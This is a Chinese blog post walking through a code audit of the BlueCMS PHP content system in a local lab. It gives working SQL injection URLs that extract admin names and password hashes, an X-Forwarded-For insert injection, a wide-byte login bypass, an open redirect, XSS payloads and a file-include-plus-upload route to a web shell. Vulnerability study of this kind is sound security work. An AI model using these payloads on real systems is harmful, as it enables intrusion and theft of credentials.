> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vvUqVi5VIaYavEK38SgBwg)

  发现公众号上好像没什么代码审计的文章，于是便把之前自己的笔记拿过来给大家分享一下，这个 cms 基本已经被玩烂了，但是还是有一些学习意义的。

源码下载地址：https://cowtransfer.com/s/79b5df8108f240

目录结构如下

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAm1nLicthic6h9yoD3j5mREqI0VxFxghCrcJljF6BCnZdqss26evIQq3w/640?wx_fmt=png)

搭建过程不再赘述。

对于这类比较小的 cms，可以通过 seay 代码审计工具快速审计。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoANrD7Q03FDxV26F4UKic5hicGlQO5X1vxnddryerCJr9Q8giaiaoJEw5bug/640?wx_fmt=png)

SQL 注入漏洞：

第一处、ad_js.php：

代码逻辑很简单，如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAUicdqkWhWeMCiaypzibb8c7DTwnuqdlac25Ye2PxfzEDDhiaew2X5gEibZw/640?wx_fmt=png)

而这个代码基本上可以说是没有任何防护的直接将传递的字符串带入到了 SQL 语句进行查询，而在这之前，文件的开始，会包含一个 common.inc.php 文件，

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAXfo72sDo0EelNCARjvRT4hIrzuRSdZpBKDkkOwsqc8axu1txxMj5zA/640?wx_fmt=png)

我们跟进看一下。其内容需要我们注意的是：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAEdJiazZkibvEnnU4FmxveTRX1RVRM9gpLdnsiabxvRxYR2eN2yF2JbM5A/640?wx_fmt=png)

magic_quotes_gpc 函数在 php 中的作用是判断解析用户提示的数据，如包括有: post、get、cookie 过来的数据增加转义字符 “\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。

如果没有开启 gpc，对 $_GET、$_POST、$_COOKIES、$_REQUEST 使用 deep_addslashes() 函数过滤一遍，那么我们跟踪一下这个函数，在 PHPSTORM 中，选中函数使用 Ctrl+B 就可以跳转到函数的定义位置了：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAOZ4GqmiaNV6CKuphia9Nk1ucjpHpnuLEzwJyDoPqKgVBOdPlylbFfRAA/640?wx_fmt=png)

可以看到就是调用 addslashes() 函数去过滤传递过来的值。

addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。

预定义字符是：

*   单引号（'）
    
*   双引号（"）
    
*   反斜杠（\）
    
*   NULL
    

而我们刚才可以看到，我们传递给 $ad_id 的内容是没有被单引号包裹的，所以 addslashes 并不起作用。

而 getone 函数，也仅仅是一个数据库查询使用的，并无其他过滤

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAXCYl2LtSIqrN7icNAFKYPd9TLEbBzV285y3ShBeaciaHLga6s456C78w/640?wx_fmt=png)

那么这样一个 SQL 注入也就出来了。唯一要注意的是其输出，是在注释里面的：

```
echo "<!--\r\ndocument.write(\"".$ad_content."\");\r\n-->\r\n";
```

payload 如下：

```
view-source:http://192.168.2.113/bluecms/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()
view-source:http://192.168.2.113/bluecms/ad_js.php?ad_id=1 union select  1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e
view-source:http://192.168.2.113/bluecms/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,group_concat(admin_name,0x3a,pwd)%20from%20blue_admin
```

ps：表名需要使用 hex，否则就会需要输入单引号，被 addslashes 所过滤。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAXjU8iazrNYKZC6A9lBekl9jrt1gviaghKQBj3OSMyPjLUKibibeDbA1Wqg/640?wx_fmt=png)

第二处、guest_book.php(XFF 注入)：

因为前面我们已经说过了，没有对 $_SERVER 进行过滤，所以使用 X-Forwarded-For 或者 CLIENT-IP 可以伪装 ip 进行 SQL 注入。

此处有一个 onlineip，目测可能是 ip 获取的地方：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAaQ5NANwFSicibezV0fzo1t1qImibjNWATWPf99l9o0r0ibdAIVcdMVzicOQ/640?wx_fmt=png)

跟踪该变量：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAp1JdVGVBP8mHL4z4cLnsPSTmd2GUBy4uAffezDdJmaXIMDXvGnk0EQ/640?wx_fmt=png)

发现其是 getip 的值，继续跟踪该函数：

```
function getip()
{
   if (getenv('HTTP_CLIENT_IP'))
   {
      $ip = getenv('HTTP_CLIENT_IP'); 
   }
   elseif (getenv('HTTP_X_FORWARDED_FOR')) 
   { //获取客户端用代理服务器访问时的真实ip 地址
      $ip = getenv('HTTP_X_FORWARDED_FOR');
   }
   elseif (getenv('HTTP_X_FORWARDED')) 
   { 
      $ip = getenv('HTTP_X_FORWARDED');
   }
   elseif (getenv('HTTP_FORWARDED_FOR'))
   {
      $ip = getenv('HTTP_FORWARDED_FOR'); 
   }
   elseif (getenv('HTTP_FORWARDED'))
   {
      $ip = getenv('HTTP_FORWARDED');
   }
   else
   { 
      $ip = $_SERVER['REMOTE_ADDR'];
   }
   return $ip;
}
```

而 query 函数也并无过滤，所以一个 insert 型注入就出来了

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoA6vDyLxAJStKBuwta9PhfbxZUDUhbN8WxGpzn055XvByc4kNb0icjYLw/640?wx_fmt=png)

而这里的 SQL 语句为：

```
INSERT INTO " . table('guest_book') . " (id, rid, user_id, add_time, ip, content) 
      VALUES ('', '$rid', '$user_id', '$timestamp', '$online_ip', '$content')
```

我们需要一定的闭合操作，变为下面这样：

```
INSERT INTO " . table('guest_book') . " (id, rid, user_id, add_time, ip, content) 
      VALUES ('', '$rid', '$user_id', '$timestamp', '127.0.0.1',database())-- +', '$content')
```

漏洞演示：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAg2d84zbics9WrI9ZJBLicXibOibAoJCHz6FVcrVK0gZ3l5HnywqRibomfeA/640?wx_fmt=png)

访问留言处，数据库名已经出来了：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAUExpEib3UGStCP6lz8Nuz9jdVYXP3f6P3ia0ibTxdrD0Xbax8ysaibVW1g/640?wx_fmt=png)

第三处、admin/login.php（宽字节万能密码）

这个其实主要是页面编码问题导致的，gbk2312，我们来看一下代码是怎么写的：

首先把接收的参数放入 check_admin 进行检测

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAp1vuBAarOAhibadoBAAXoc90mGl52dy6dv58HsyadhiaSynravrzJQvQ/640?wx_fmt=png)

check_admin：

```
function check_admin($name, $pwd)
{
   global $db;
   $row = $db->getone("SELECT COUNT(*) AS num FROM ".table('admin')." WHERE admin_);
   if($row['num'] > 0)
   {
      return true;
   }
   else
   {
      return false;
   }
}
```

name 被单引号包裹，所以会被 addslashes() 函数过滤，但因为页面编码问题，我们可以使用宽字节注入。SQLMAP 一把梭：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoADBvIdvl7DRmQUxd8ic5TNH8TCo5GaiaB1SpUatOxb8AiaMiaVlgpdAavjA/640?wx_fmt=png)

url 跳转

user.php

文件中的 $act 函数明显是一个类似选择功能，当登录成功时，会

```
showmsg('欢迎您 '.$user_name.' 回来，现在将转到...', $from);
```

而 form 是

```
$from = !empty($_REQUEST['from']) ? $_REQUEST['from'] : '';
```

而没有任何过滤，然后我们跟一下 showmsg

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAt4icTjQojEpIS5xsuHs3eOrIw7uz8JFcbdDm5JSDTHrCd7MTOK6s8Lw/640?wx_fmt=png)

最后会显示 showmsg.htm，我们再看一下 showmsg.htm：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAIibJCE4eSicPIuPRQ0gZU7aSDBFDt4aOhcxSMza5879XghgnD5nRchRw/640?wx_fmt=png)

这样就造成了一个 url 跳转，需要注意的是对表单数据进行 base64

漏洞复现：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAZH2lmECwc3jGSzK6icEf7xIsbbvhfU452aRyWQoZsskdECFmmw2kXEQ/640?wx_fmt=png)

xss 漏洞

user.php（反射型 xss）

在页面上的 from 为隐藏，且，所以闭合即可利用。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAIHocUmHeAsmwsbUM6OcQegVBppO8iczKr7iaQUoTwdGkSygySebTlAibA/640?wx_fmt=png)

```
http://10.10.20.20/bluecms/user.php?from=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoAvbe9Mjkxk6EBuF93MkoH6mLHVkl19CHKa9l3clYmLiaBsz5sOUX64cw/640?wx_fmt=png)

user.php（存储型 xss）

在 do_add_news 时，$content 没有被 htmlspecialchars 过滤，只被 filter_data 过滤：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoABF00Ya0CjqUBbcL2b0InKwf0RRnHpbib6J70kjuUy4aXibC40dm4my1w/640?wx_fmt=png)

跟一下函数：

```
function filter_data($str)
{
   $str = preg_replace("/<(\/?)(script|i?frame|meta|link)(\s*)[^<]*>/", "", $str);
   return $str;
}
```

过滤比较简单，payload 如下：

```
<img src="" onerror="alert(1111)">
```

前端有过滤，所以使用 bp 发包

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoA1SYVasqmt9LicQPWDKFAn0icEFXFPvicTvGQfwgalBKVCPIddIynO5IYw/640?wx_fmt=png)

即可。

GetShell

user.php（文件包含 + 文件上传）

在文件的

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UVy6z7PFvuE9TThVhPbvoA6Nllic9DhQq2lJoNsK7WLiaPKFLFNyhNVT9YdRtqXRK8xTj2m5QtfZ2A/640?wx_fmt=png)

有明显的包含，且无过滤，而会员处又拥有上传功能，这样我们便拥有了一条文件包含 + 文件上传 ==getshell 的利用链。

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)